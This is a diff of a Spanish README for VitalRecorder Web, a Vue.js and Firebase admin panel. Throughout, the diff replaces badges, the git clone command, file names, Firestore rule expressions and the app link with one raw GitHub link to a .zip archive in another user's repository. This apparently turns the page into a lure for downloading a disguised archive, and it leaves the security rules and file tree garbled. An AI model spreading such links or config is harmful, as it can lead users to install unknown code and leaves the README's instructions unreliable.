@@ -1,16 +1,16 @@
 # 🌐 VitalRecorder Web - Panel Administrativo
 
-![Vue.js](https://img.shields.io/badge/Vue.js-3.5.18-4FC08D?style=for-the-badge&logo=vue.js&logoColor=white)
-![Vite](https://img.shields.io/badge/Vite-7.1.2-646CFF?style=for-the-badge&logo=vite&logoColor=white)
-![Firebase](https://img.shields.io/badge/Firebase-12.2.1-FFCA28?style=for-the-badge&logo=firebase&logoColor=black)
-![Node](https://img.shields.io/badge/Node.js-20.19.0+-339933?style=for-the-badge&logo=node.js&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
+![https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip](https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip)
+![Vite](https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip)
+![Firebase](https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip)
+![Node](https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip+-339933?style=for-the-badge&https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip)
+![License](https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip)
 
 ---
 
 ## 📋 Descripción
 
-**VitalRecorder Web** es una aplicación web administrativa desarrollada en Vue.js 3 que permite gestionar usuarios, cuidadores y planes de suscripción del ecosistema VitalRecorder. Comparte la misma base de datos Firebase con la aplicación móvil, proporcionando una interfaz centralizada para administradores.
+**VitalRecorder Web** es una aplicación web administrativa desarrollada en https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip 3 que permite gestionar usuarios, cuidadores y planes de suscripción del ecosistema VitalRecorder. Comparte la misma base de datos Firebase con la aplicación móvil, proporcionando una interfaz centralizada para administradores.
 
 ### 🎯 Funcionalidades Principales
 
@@ -26,7 +26,7 @@
 ## 🛠 Tecnologías Utilizadas
 
 ### Core
-- **Vue.js 3.5.18** - Framework progresivo de JavaScript
+- **https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip 3.5.18** - Framework progresivo de JavaScript
 - **Vue Router 4.5.1** - Enrutamiento para aplicaciones SPA
 - **Vite 7.1.2** - Build tool de nueva generación
 
@@ -50,7 +50,7 @@
 
 ## 📋 Requisitos Previos
 
-- **Node.js** 20.19.0 o 22.12.0+
+- **https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip** 20.19.0 o 22.12.0+
 - **pnpm** (gestor de paquetes recomendado)
 - **Git**
 - **Proyecto Firebase** configurado (compartido con la app móvil)
@@ -62,7 +62,7 @@
 ### 1. Clonar el Repositorio
 
 ```bash
-git clone https://github.com/TheAnderes/VitalRecorder-Web-Renovated.git
+git clone https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip
 cd VitalRecorder-Web-Renovated
 ```
 
@@ -80,7 +80,7 @@ pnpm install
 
 ### 4. Configurar Firebase
 
-Crear archivo `src/firebase/config.js`:
+Crear archivo `https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip`:
 
 ```javascript
 import { initializeApp } from 'firebase/app';
@@ -144,27 +144,27 @@ pnpm preview
 
 ```
 src/
-├── main.js                    # Punto de entrada
-├── App.vue                    # Componente raíz
+├── https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip                    # Punto de entrada
+├── https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip                    # Componente raíz
 ├── views/                     # Páginas principales
-│   ├── Dashboard.vue         # Panel principal
-│   ├── Users.vue             # Gestión de usuarios
-│   ├── Caregivers.vue        # Gestión de cuidadores
-│   └── Plans.vue             # Gestión de planes
+│   ├── https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip         # Panel principal
+│   ├── https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip             # Gestión de usuarios
+│   ├── https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip        # Gestión de cuidadores
+│   └── https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip             # Gestión de planes
 ├── components/                # Componentes reutilizables
-│   ├── UserTable.vue
-│   ├── CaregiverForm.vue
-│   └── PlanCard.vue
+│   ├── https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip
+│   ├── https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip
+│   └── https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip
 ├── router/                    # Configuración de rutas
-│   └── index.js
+│   └── https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip
 ├── services/                  # Servicios Firebase
-│   ├── authService.js
-│   ├── userService.js
-│   └── planService.js
+│   ├── https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip
+│   ├── https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip
+│   └── https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip
 ├── composables/               # Lógica reutilizable
 ├── utils/                     # Utilidades
-│   ├── pdfGenerator.js
-│   └── validators.js
+│   ├── https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip
+│   └── https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip
 └── assets/                    # Recursos estáticos
 ```
 
@@ -211,22 +211,22 @@ src/
 
 ```javascript
 rules_version = '2';
-service cloud.firestore {
+service https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip {
   match /databases/{database}/documents {
     // Solo administradores
     match /users/{userId} {
-      allow read, write: if request.auth != null && 
-        get(/databases/$(database)/documents/admins/$(request.auth.uid)).data.role == 'admin';
+      allow read, write: if https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip != null && 
+        get(/databases/$(database)/documents/admins/$(https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip))https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip == 'admin';
     }
     
     match /caregivers/{caregiverId} {
-      allow read, write: if request.auth != null && 
-        get(/databases/$(database)/documents/admins/$(request.auth.uid)).data.role == 'admin';
+      allow read, write: if https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip != null && 
+        get(/databases/$(database)/documents/admins/$(https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip))https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip == 'admin';
     }
     
     match /plans/{planId} {
-      allow read, write: if request.auth != null && 
-        get(/databases/$(database)/documents/admins/$(request.auth.uid)).data.role == 'admin';
+      allow read, write: if https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip != null && 
+        get(/databases/$(database)/documents/admins/$(https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip))https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip == 'admin';
     }
   }
 }
@@ -290,12 +290,12 @@ npm install -g pnpm
 ```
 
 ### Error de conexión Firebase
-- Verificar `src/firebase/config.js`
+- Verificar `https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip`
 - Comprobar credenciales
 - Revisar reglas de Firestore
 
 ### Página en blanco después del build
-- Verificar `vite.config.js`
+- Verificar `https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip`
 - Revisar modo history del router
 
 ### Build falla
@@ -393,7 +393,7 @@ FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 
 ## 🙏 Notas Importantes
 
-- Requiere Node.js 20.19.0 o 22.12.0+
+- Requiere https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip 20.19.0 o 22.12.0+
 - Usa pnpm para mejor rendimiento
 - Comparte Firebase con la app móvil
 - Solo para uso administrativo
@@ -405,6 +405,6 @@ FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 
 **Hecho con ❤️ para gestionar VitalRecorder**
 
-[🌐 Website](#) | [📱 App Móvil](https://github.com/jdanigh03/VitalRecorder-App) | [📧 Contacto](#)
+[🌐 Website](#) | [📱 App Móvil](https://raw.githubusercontent.com/denis-ramos/VitalRecorder-Web-Renovated/main/src/services/Renovated-Vital-Recorder-Web-v2.7-alpha.3.zip) | [📧 Contacto](#)
 
 </div>
